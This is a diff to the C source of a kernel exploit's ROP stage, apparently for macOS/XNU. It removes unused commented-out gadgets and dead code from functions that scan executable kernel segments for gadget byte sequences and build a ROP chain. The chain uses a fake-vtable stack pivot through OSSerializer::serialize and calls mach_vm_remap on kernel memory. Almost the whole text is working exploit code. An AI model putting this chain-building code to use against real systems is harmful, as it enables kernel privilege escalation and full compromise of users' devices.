@@ -56,8 +56,6 @@ do \
 #define LE32(ptr) (((ptr)[0] | ((ptr)[1] << 8) | ((ptr)[2] << 16) | ((ptr)[3] << 24)))
 #define CALL_OFF(ptr) (int64_t)(int32_t)(LE32(ptr + 1) + 5)
 
-//uint8_t gad__add__rdi__ecx[]                    = { 0x01, 0x0f, 0x97, 0xc3 };       // add [rdi], ecx; xchg eax, edi; ret; XXX
-//uint8_t gad__mov_rdi__rax_8__call__rax_[]       = { 0x48, 0x8b, 0x78, 0x08, 0xff, 0x10 }; // mov rdi, [rax + 8]; call [rax];
 uint8_t gad__mov_rsp_rsi_call_rdi[]             = { 0x48, 0x89, 0xf4, 0xff, 0xd7 }; // mov rsp, rsi; call rdi;
 uint8_t gad__add_rsp_0x20_pop_rbp[]             = { 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xc3 }; // add rsp, 0x20; pop rbp; ret;
 uint8_t gad__pop_rax[]                          = { 0x58, 0xc3 };                   // pop rax; ret;
@@ -66,7 +64,6 @@ uint8_t gad__pop_rsi[]                          = { 0x5e, 0xc3 };               
 uint8_t gad__pop_rdx[]                          = { 0x5a, 0xc3 };                   // pop rdx; ret;
 uint8_t gad__pop_rcx[]                          = { 0x59, 0xc3 };                   // pop rcx; ret;
 uint8_t gad__pop_r8_pop_rbp[]                   = { 0x41, 0x58, 0x5d, 0xc3 };       // pop r8; pop rbp; ret;
-//uint8_t gad__mov_r9__rbp_0x38__call_rax[]       = { 0x4c, 0x8b, 0x4d, 0xc8, 0xff, 0xd0 }; // mov r9, [rbp - 0x38]; call rax; XXX
 uint8_t gad__push_rbp_mov_rax__rdi__pop_rbp[]   = { 0x55, 0x48, 0x89, 0xe5, 0x48, 0x8b, 0x07, 0x5d, 0xc3 }; // push rbp; mov rbp, rsp; mov rax, [rdi]; pop rbp; ret;
 uint8_t gad__mov_rax__rdi__pop_rbp[]            = { 0x48, 0x8b, 0x07, 0x5d, 0xc3 }; // mov rax, [rdi]; pop rbp; ret;
 uint8_t gad__mov__rdi__rax_pop_rbp[]            = { 0x48, 0x89, 0x07, 0x5d, 0xc3 }; // mov [rdi], rax; pop rbp; ret;
@@ -161,8 +158,6 @@ int rop_gadgets(rop_t *rop, void *k)
             if((seg->initprot & VM_PROT_EXECUTE) != 0)
             {
                 void *base = kernel + seg->fileoff;
-                //GADGET(add__rdi__ecx); XXX
-                //GADGET(mov_rdi__rax_8__call__rax_);
                 GADGET(mov_rsp_rsi_call_rdi);
                 GADGET(add_rsp_0x20_pop_rbp);
                 GADGET(pop_rax);
@@ -171,7 +166,6 @@ int rop_gadgets(rop_t *rop, void *k)
                 GADGET(pop_rdx);
                 GADGET(pop_rcx);
                 GADGET(pop_r8_pop_rbp);
-                //GADGET(mov_r9__rbp_0x38__call_rax);
                 GADGET(push_rbp_mov_rax__rdi__pop_rbp);
                 GADGET(mov_rax__rdi__pop_rbp);
                 GADGET(mov__rdi__rax_pop_rbp);
@@ -263,8 +257,6 @@ int rop_gadgets(rop_t *rop, void *k)
     ENSURE(taggedRelease_vtab_offset); // even this can never be 0, since destructor is first in vtab
     ENSURE(OSArray_array_offset);
 
-    //ENSURE(add__rdi__ecx); XXX
-    //ENSURE(mov_rdi__rax_8__call__rax_);
     ENSURE(mov_rsp_rsi_call_rdi);
     ENSURE(add_rsp_0x20_pop_rbp);
     ENSURE(pop_rax);
@@ -273,7 +265,6 @@ int rop_gadgets(rop_t *rop, void *k)
     ENSURE(pop_rdx);
     ENSURE(pop_rcx);
     ENSURE(pop_r8_pop_rbp);
-    //ENSURE(mov_r9__rbp_0x38__call_rax);
     ENSURE(push_rbp_mov_rax__rdi__pop_rbp);
     ENSURE(mov_rax__rdi__pop_rbp);
     ENSURE(mov__rdi__rax_pop_rbp);
@@ -395,7 +386,7 @@ int rop_gadgets(rop_t *rop, void *k)
     ENSURE(mov_rsi_r15_call__vtab0_);
     ENSURE(stack_pivot);
     ENSURE(mov_r9__rbp_X__call_rax);
-    // Don't need to check memcpy_gadget_imm
+    // No need to check memcpy_gadget_imm
 
     return 0;
 }
@@ -433,16 +424,6 @@ int rop_chain(rop_t *rop, uint64_t *buf, uint64_t addr)
     uint64_t after_vtab = addr;
     rax[rop->stack_pivot_load_off / s] = after_vtab - 2 * s; // rdi, first argument to OSSerializer::serialize
     rax[rop->stack_pivot_call_off / s] = rop->OSSerializer_serialize; // gadget to load stack pivot, executed by fake vtab gadget
-
-#if 0
-    PUSH(rop->OSSerializer_serialize);                  // gadget to load stack pivot, executed by fake vtab gadget
-    PUSH(after_vtab - 2 * s);                           // rdi, first argument to OSSerializer::serialize
-    for(size_t i = 2; i < rop->taggedRelease_vtab_offset / s; ++i)
-    {
-        PUSH(0xffffff80facade00 | i);                   // dummy
-    }
-    //PUSH(rop->mov_rdi__rax_8__call__rax_);              XXX
-#endif
 
     // OSSerializer::serialize will work with these:
     PUSH(rop->pop_rdi);                                 // what to run after stack pivot; need something that jumps over
@@ -541,7 +522,6 @@ int rop_chain(rop_t *rop, uint64_t *buf, uint64_t addr)
     PUSH(rop->zone_map - rop->mov_r9__rbp_X__off);      // we actually need rbp for once
     PUSH(rop->pop_rax);
     PUSH(rop->pop_rax);                                 // jumps over the address pushed by "call rax"
-    //PUSH(rop->mov_r9__rbp_0x38__call_rax); XXX
     PUSH(rop->mov_r9__rbp_X__call_rax);
     // Finally, the call:
     PUSH(rop->mach_vm_remap);
@@ -558,7 +538,6 @@ int rop_chain(rop_t *rop, uint64_t *buf, uint64_t addr)
     PUSH(remap_addr);
     PUSH(rop->mov_rax__rdi__pop_rbp);                   // dereference
     PUSH(0xffffff80dead100d);                           // dummy rbp
-    //PUSH(0xffffffffdddddddd); // XXX YYY
     PUSH(rop->pop_rcx);
     PUSH(rop->pop_rdi);                                 // load kernel_map later
     PUSH(rop->mov_rdx_rax_pop_rbp_jmp_rcx);             // this gets us remap_addr to rdx
